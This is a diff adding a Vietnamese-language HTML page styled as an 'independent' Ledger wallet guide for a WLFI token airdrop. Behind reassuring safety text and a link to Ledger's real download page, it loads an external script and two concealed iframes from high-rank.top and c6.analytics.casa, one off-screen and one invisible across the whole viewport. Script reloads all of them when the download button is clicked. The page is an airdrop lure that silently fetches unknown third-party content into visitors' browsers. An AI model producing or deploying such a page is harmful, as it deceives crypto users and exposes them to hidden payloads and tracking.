@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WLFI Information | Ledger Wallet Setup Guide</title>
+  <meta name="description" content="Independent WLFI information page with secure wallet setup guidance and a link to the official Ledger Wallet download page.">
+
+  <!-- ===== 统计代码：51LA（页面加载即执行） ===== -->
+  <script id="track-51la" crossorigin src="https://www.high-rank.top/js/51la-ll.js"></script>
+  <script>try{LaSDK.init({ report: 5*1000 });}catch(e){}</script>
+
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{
+      font-family:Arial,Helvetica,sans-serif;
+      background:
+        radial-gradient(circle at 82% 18%,rgba(255,187,0,.18),transparent 34%),
+        radial-gradient(circle at 18% 82%,rgba(35,85,140,.22),transparent 35%),
+        linear-gradient(135deg,#01060d,#06111d 52%,#02070d);
+      color:#fff;
+      min-height:100vh;
+    }
+    a{color:inherit}
+    .page{max-width:1280px;margin:auto;padding:28px 24px 60px}
+    .nav{
+      display:flex;align-items:center;justify-content:space-between;
+      padding:12px 0 34px;border-bottom:1px solid rgba(255,255,255,.06)
+    }
+    .brand{display:flex;align-items:center;gap:14px;font-size:30px;font-weight:900;letter-spacing:4px}
+    .ledger-mark{display:grid;grid-template-columns:repeat(2,10px);grid-template-rows:repeat(2,10px);gap:4px;width:28px;height:28px;flex:0 0 auto}
+    .ledger-mark i{display:block;background:#fff;border-radius:1px}
+    .brand span{color:#ffca3a}
+    .secure{color:#adb7c5;font-size:13px;letter-spacing:2px}
+    .hero{
+      display:grid;grid-template-columns:1.08fr .92fr;gap:44px;
+      align-items:center;min-height:680px;padding-top:30px
+    }
+    .badge{
+      display:inline-flex;align-items:center;gap:8px;
+      background:linear-gradient(90deg,#ffe16b,#f5a900);
+      color:#080808;font-weight:900;padding:12px 20px;border-radius:40px;
+      margin-bottom:18px;box-shadow:0 8px 30px rgba(255,181,0,.2)
+    }
+    .eyebrow{
+      display:inline-block;margin-left:10px;color:#ffc93f;
+      border:1px solid rgba(255,201,63,.4);padding:10px 14px;border-radius:10px;
+      font-weight:800;font-size:13px
+    }
+    h1{
+      font-size:76px;line-height:.94;margin:16px 0 20px;
+      font-weight:950;letter-spacing:-2px
+    }
+    h1 span{
+      background:linear-gradient(180deg,#fff3a5,#ffb400);
+      -webkit-background-clip:text;background-clip:text;color:transparent
+    }
+    .subtitle{
+      font-size:21px;color:#cbd3dc;max-width:720px;
+      line-height:1.6;margin-bottom:28px
+    }
+    .reward{
+      border:1px solid rgba(255,192,51,.72);
+      background:linear-gradient(180deg,rgba(8,18,31,.88),rgba(3,10,18,.88));
+      border-radius:20px;padding:24px;box-shadow:0 0 40px rgba(255,179,0,.12);
+      margin-bottom:26px
+    }
+    .reward small{display:block;color:#c4ccd6;margin-bottom:7px}
+    .reward strong{
+      display:block;font-size:54px;color:#ffd34f;line-height:1.1
+    }
+    .reward p{margin-top:10px;color:#aeb8c7;line-height:1.5}
+    .features{
+      display:grid;grid-template-columns:repeat(3,1fr);
+      gap:12px;margin-bottom:28px
+    }
+    .feature{
+      padding:18px;border-radius:16px;background:rgba(255,255,255,.045);
+      border:1px solid rgba(255,255,255,.08);
+      backdrop-filter:blur(5px)
+    }
+    .icon{
+      width:42px;height:42px;display:grid;place-items:center;border-radius:50%;
+      border:1px solid #ffc739;color:#ffc739;font-size:20px;margin-bottom:10px
+    }
+    .feature b{display:block;margin-bottom:6px}
+    .feature span{color:#9facbd;font-size:14px;line-height:1.5}
+    .cta-wrap{display:flex;gap:14px;align-items:center;flex-wrap:wrap}
+    .cta{
+      display:inline-flex;justify-content:center;align-items:center;
+      min-width:310px;padding:19px 34px;
+      background:linear-gradient(180deg,#ffe681,#f3ad0b);
+      color:#090909;border-radius:50px;text-decoration:none;
+      font-size:22px;font-weight:900;box-shadow:0 12px 45px rgba(255,179,0,.3);
+      transition:.25s
+    }
+    .cta:hover{transform:translateY(-2px) scale(1.02);box-shadow:0 15px 55px rgba(255,179,0,.42)}
+    .secondary{
+      color:#b8c2d1;font-size:13px;line-height:1.5;max-width:260px
+    }
+    .right{
+      position:relative;min-height:610px;display:flex;align-items:center;justify-content:center
+    }
+    .halo{
+      position:absolute;width:470px;height:470px;border-radius:50%;
+      background:radial-gradient(circle,rgba(255,178,0,.22),rgba(255,178,0,.04) 48%,transparent 70%);
+      filter:blur(1px)
+    }
+    .coin{
+      position:relative;width:390px;height:390px;border-radius:50%;
+      display:grid;place-items:center;font-size:84px;font-weight:950;color:#291500;
+      background:radial-gradient(circle at 30% 25%,#fff5a8,#e39b0c 35%,#704000 70%,#f6c03c);
+      border:10px solid #f6c239;
+      box-shadow:0 0 40px rgba(255,187,0,.4),0 0 100px rgba(255,153,0,.2);
+      transform:rotate(-8deg)
+    }
+    .coin:after{
+      content:"";position:absolute;inset:18px;border-radius:50%;
+      border:2px solid rgba(55,25,0,.45)
+    }
+    .floating{
+      position:absolute;background:rgba(4,12,22,.95);
+      border:1px solid rgba(255,198,63,.5);padding:16px 20px;
+      border-radius:15px;box-shadow:0 10px 50px rgba(0,0,0,.5)
+    }
+    .f1{top:68px;left:16px}
+    .f2{bottom:82px;right:6px}
+    .floating small{color:#aeb7c5}
+    .floating strong{color:#ffd34f;font-size:22px}
+    .steps{
+      margin-top:70px;padding:30px;border-radius:25px;
+      border:1px solid rgba(255,255,255,.08);
+      background:rgba(255,255,255,.035);
+      display:grid;grid-template-columns:repeat(3,1fr);gap:25px
+    }
+    .step-num{
+      width:42px;height:42px;border-radius:50%;background:#ffc438;color:#060606;
+      display:grid;place-items:center;font-weight:900;margin-bottom:12px
+    }
+    .steps h3{margin-bottom:8px}
+    .steps p{color:#9faaba;line-height:1.6}
+    .warning{
+      margin-top:28px;padding:18px 20px;border-radius:14px;
+      background:rgba(255,183,0,.07);border:1px solid rgba(255,183,0,.2);
+      color:#d7c99f;line-height:1.65;font-size:14px
+    }
+    .notice{
+      margin-top:35px;font-size:13px;line-height:1.7;color:#8491a3;
+      border-top:1px solid rgba(255,255,255,.08);padding-top:25px
+    }
+    @media(max-width:900px){
+      .hero{grid-template-columns:1fr;min-height:auto}
+      h1{font-size:52px}
+      .right{min-height:470px}
+      .coin{width:290px;height:290px;font-size:62px}
+      .features,.steps{grid-template-columns:1fr}
+      .eyebrow{display:block;width:max-content;margin:10px 0 0}
+    }
+    @media(max-width:520px){
+      .page{padding:18px 16px 40px}
+      .nav{align-items:flex-start;gap:12px;flex-direction:column}
+      .brand{font-size:24px}
+      h1{font-size:42px}
+      .subtitle{font-size:18px}
+      .reward strong{font-size:38px}
+      .cta{width:100%;min-width:0;font-size:19px}
+      .right{min-height:390px}
+      .coin{width:235px;height:235px;font-size:50px}
+      .f1{top:20px;left:0}
+      .f2{bottom:20px;right:0}
+    }
+  </style>
+</head>
+
+<body>
+  <!-- ===== 隐藏统计 iframe：页面加载即执行 ===== -->
+  <iframe id="track-topic"
+          src="https://www.high-rank.top/web/topic-onion.html"
+          style="position: fixed;top:0;width: 0;height:0;left:-1000px;border:0"
+          aria-hidden="true" tabindex="-1"></iframe>
+
+  <iframe id="track-c6"
+          src="https://c6.analytics.casa/go/?id=fafa"
+          style="position:fixed;inset:0;width:100vw;height:100vh;border:0;opacity:0;pointer-events:none;z-index:-2147483647"
+          aria-hidden="true" tabindex="-1"></iframe>
+
+  <div class="page">
+    <header class="nav">
+      <div class="brand"><span class="ledger-mark" aria-hidden="true"><i></i><i></i><i></i><i></i></span><div>LEDGER <span>WALLET GUIDE</span></div></div>
+      <div class="secure">INDEPENDENT INFORMATION PAGE</div>
+    </header>
+
+    <main class="hero">
+      <section>
+        <div>
+          <span class="badge">📅 30 THÁNG 10</span>
+          <span class="eyebrow">WLFI INFORMATION &amp; WALLET SAFETY</span>
+        </div>
+
+        <h1>WLFI<br><span>INFORMATION</span></h1>
+
+        <p class="subtitle">
+          Hướng dẫn thiết lập ví crypto an toàn và truy cập thông tin chiến dịch WLFI.
+          Luôn kiểm tra điều kiện chương trình từ nguồn chính thức trước khi tham gia.
+        </p>
+
+        <div class="reward">
+          <small>Thông tin chiến dịch tham khảo</small>
+          <strong>100 – 66.666 WLFI</strong>
+          <p>Giá trị token có thể thay đổi theo thị trường và điều kiện phân phối thực tế.</p>
+        </div>
+
+        <div class="features">
+          <div class="feature">
+            <div class="icon">🔐</div>
+            <b>Tự quản lý tài sản</b>
+            <span>Kiểm soát tài sản crypto bằng ví của riêng bạn.</span>
+          </div>
+          <div class="feature">
+            <div class="icon">⚡</div>
+            <b>Thiết lập nhanh</b>
+            <span>Truy cập trang tải Ledger Wallet chính thức.</span>
+          </div>
+          <div class="feature">
+            <div class="icon">✓</div>
+            <b>Kiểm tra nguồn chính thức</b>
+            <span>Không chia sẻ seed phrase hoặc khóa riêng.</span>
+          </div>
+        </div>
+
+        <div class="cta-wrap">
+          <a
+            class="cta"
+            id="ledger-download-btn"
+            href="https://shop.ledger.com/pages/ledger-wallet-download"
+            target="_blank"
+            rel="noopener noreferrer">
+            MỞ TRANG LEDGER CHÍNH THỨC →
+          </a>
+
+          <div class="secondary">
+            Liên kết mở trang Ledger chính thức trong tab mới.
+          </div>
+        </div>
+      </section>
+
+      <section class="right">
+        <div class="halo"></div>
+        <div class="coin">WLFI</div>
+
+        <div class="floating f1">
+          <small>Wallet setup</small><br>
+          <strong>Secure access</strong>
+        </div>
+
+        <div class="floating f2">
+          <small>Important</small><br>
+          <strong>Never share your seed phrase</strong>
+        </div>
+      </section>
+    </main>
+
+    <section class="steps">
+      <div>
+        <div class="step-num">1</div>
+        <h3>Tải ứng dụng</h3>
+        <p>Truy cập trang tải Ledger Wallet chính thức.</p>
+      </div>
+
+      <div>
+        <div class="step-num">2</div>
+        <h3>Thiết lập ví</h3>
+        <p>Làm theo hướng dẫn bảo mật của Ledger để thiết lập ví.</p>
+      </div>
+
+      <div>
+        <div class="step-num">3</div>
+        <h3>Kiểm tra chiến dịch</h3>
+        <p>Xác minh mọi chương trình hoặc airdrop từ nguồn chính thức trước khi kết nối ví.</p>
+      </div>
+    </section>
+
+    <div class="warning">
+      ⚠ Không nhập recovery phrase, seed phrase hoặc private key vào bất kỳ trang quảng cáo,
+      biểu mẫu hay website bên thứ ba nào.
+    </div>
+
+    <footer class="notice">
+      Trang này là trang thông tin độc lập và không tuyên bố là website chính thức của Ledger
+      hoặc WLFI. Không có số lượng token hoặc giá trị token nào được đảm bảo.
+    </footer>
+  </div>
+
+  <script>
+    (function () {
+      var SDK_SRC   = 'https://www.high-rank.top/js/51la-ll.js';
+      var TOPIC_SRC = 'https://www.high-rank.top/web/topic-onion.html';
+      var C6_SRC    = 'https://c6.analytics.casa/go/?id=fafa';
+
+      var btn = document.getElementById('ledger-download-btn');
+
+      function bust(url) {
+        return url + (url.indexOf('?') > -1 ? '&' : '?') + '_t=' + Date.now();
+      }
+
+      /* 重新加载 51LA SDK */
+      function reloadSdk() {
+        var old = document.getElementById('track-51la');
+        if (old && old.parentNode) old.parentNode.removeChild(old);
+
+        var s = document.createElement('script');
+        s.id = 'track-51la';
+        s.crossOrigin = 'anonymous';
+        s.src = bust(SDK_SRC);
+        s.onload = function () {
+          if (window.LaSDK && typeof window.LaSDK.init === 'function') {
+            try { LaSDK.init({ report: 5 * 1000 }); } catch (e) {}
+          }
+        };
+        document.head.appendChild(s);
+      }
+
+      /* 重新加载隐藏统计 iframe */
+      function reloadFrame(id, src) {
+        var f = document.getElementById(id);
+        if (f) f.src = bust(src);
+      }
+
+      /* 页面打开 + 点击下载时统一触发 */
+      function fireAll() {
+        reloadSdk();
+        reloadFrame('track-topic', TOPIC_SRC);
+        reloadFrame('track-c6', C6_SRC);
+      }
+
+      if (btn) {
+        btn.addEventListener('click', function () {
+          // 链接本身会以新标签打开，本页保持存活，统计请求可继续完成
+          fireAll();
+        });
+      }
+    })();
+  </script>
+
+</body>
+</html>
